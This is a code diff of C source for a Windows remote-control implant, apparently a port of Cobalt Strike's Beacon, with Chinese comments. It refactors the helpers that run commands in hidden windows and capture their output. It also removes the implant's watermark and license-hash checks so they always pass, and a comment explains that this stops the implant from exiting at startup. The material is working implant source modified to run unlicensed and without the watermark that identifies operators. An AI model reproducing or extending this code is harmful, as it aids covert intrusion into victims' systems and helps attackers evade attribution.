@@ -85,6 +85,16 @@ void command_sleep(char * buffer, int length) {
 }
 
 /* 调用命令...不使用shell */
+/* 隐窗 STARTUPINFO 骨架（全部 spawn 点共用：out=NULL 或指向管道写端） */
+void startupinfo_hidden(STARTUPINFO * si, HANDLE out) {
+	GetStartupInfo(si);
+	si->dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+	si->wShowWindow = SW_HIDE;
+	si->hStdOutput = out;
+	si->hStdError = out;
+	si->hStdInput = NULL;
+}
+
 void command_execute(char * buffer, int length) {
 	char    cbuffer[1024];
 	STARTUPINFO si;
@@ -95,13 +105,7 @@ void command_execute(char * buffer, int length) {
 	si.cb = sizeof(si);
 	ZeroMemory( &pi, sizeof(pi) );
 
-	/* 进一步处理启动信息数据结构 */
-	GetStartupInfo(&si);
-	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-	si.wShowWindow = SW_HIDE;
-	si.hStdOutput = NULL;
-	si.hStdError = NULL;
-	si.hStdInput = NULL;
+		startupinfo_hidden(&si, NULL);
 
 	/* 检查命令长度 */
 	if (length > 1023)
@@ -133,13 +137,7 @@ void command_runu(char * buffer, int length) {
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
 
-	/* 进一步处理启动信息数据结构 */
-	GetStartupInfo(&si);
-	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-	si.wShowWindow = SW_HIDE;
-	si.hStdOutput = NULL;
-	si.hStdError = NULL;
-	si.hStdInput = NULL;
+		startupinfo_hidden(&si, NULL);
 
 	/* 分配本地内存 */
 	local = data_alloc(8192);
@@ -257,13 +255,7 @@ void execjob_doit(char * runme, DWORD runme_length, DWORD flags) {
 		return;
 	}
 
-	/* 进一步处理启动信息数据结构 */
-	GetStartupInfo(&si);
-	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-	si.wShowWindow = SW_HIDE;
-	si.hStdOutput = newstdout;
-	si.hStdError = newstdout;
-	si.hStdInput = NULL;
+		startupinfo_hidden(&si, newstdout);
 
 	/* 执行它 */
 	if (!execute_program_with_default_ppid(runme, runme_length, &si, &pi, CREATE_NEW_CONSOLE, FALSE)) {
@@ -555,72 +547,11 @@ BOOL check_kill_date() {
 * TRUE  - exit
 * FALSE - continue as normal
 */
+/* 水印族已移除；官方 4.9 水印即发化分支点，这里恒 FALSE */
 BOOL bad_watermark() {
-
-//	unsigned int wm = setting_int(SETTING_WATERMARK);
-	// dlog("Beacon Watermark: %d\n", wm);
-
-	/* Watermark == 0 is legacy trial license (depricated) and also hackers (boo)... */
-//	if (wm == 0) {
-		// dlog("Watermark = zero: %d\n", wm);
-//		return TRUE;
-//	}
-
-	/* Watermark < 10000 is not valid.  4.5+ will require watermarks are 5+ digits... */
-//	if (wm < 10000) {
-		// dlog("Watermark < 10000: %d\n", wm);
-//		return TRUE;
-//	}
-
-	/* 移植版中水印检查由 TeamServer 注入并在 TS 侧校验，这里恒报 "not bad"（= 继续）。
-	   注意：本函数必须返回 FALSE——原版在检查全部注释掉后仍 return TRUE，配合
-	   beacon.cpp 的 if (bad_watermark()) safe_exit() 会在启动时立即自杀。 */
 	return FALSE;
 }
 
-/*
-* The contract:
-* TRUE  - exit
-* FALSE - continue as normal
-*/
 BOOL bad_watermarkHash() {
-
-// ===========================================================
-// THIS IS REPLICATED IN .../external/sshagent/src/beacon.c
-// ===========================================================
-
-//	int watermarkKey;
-//	long wmhLen;
-//	BOOL bad = TRUE;
-
-//	unsigned int wm = setting_int(SETTING_WATERMARK);
-//	char * wmh = setting_ptr(SETTING_WATERMARK_HASH);
-
-//	if (wmh == NULL) {
-		// dlog("Checking Beacon Watermark Hash - HASH IS NULL\n");
-//		wm = 0;
-//		return TRUE;
-//	}
-
-	/* No watermark hash? */
-//	wmhLen = strlen(wmh);
-//	if (wmhLen < 1) {
-		// dlog("Checking Beacon Watermark Hash - NO HASH PROVIDED\n");
-//		wm = 0;
-//		wmhLen = 0;
-//		return TRUE;
-//	}
-
-	// dlog("Checking Beacon Watermark Hash - Watermark: %d Hash: %s Hash Length %li \n", wm, wmh, wmhLen);
-
-//	watermarkKey = createWMKey(wm);
-	// dlog("Calculated Watermark Key: %d", watermarkKey);
-
-//	bad = decodeWatermark(wmh, wmhLen, watermarkKey, wm);
-//	watermarkKey = 0;
-
-	// dlog("Exiting bad_watermarkHash with status: %i", bad);
-
-	/* 同 bad_watermark：恒报 "not bad"（= 继续），水印哈希校验由 TS 侧负责。 */
 	return FALSE;
 }
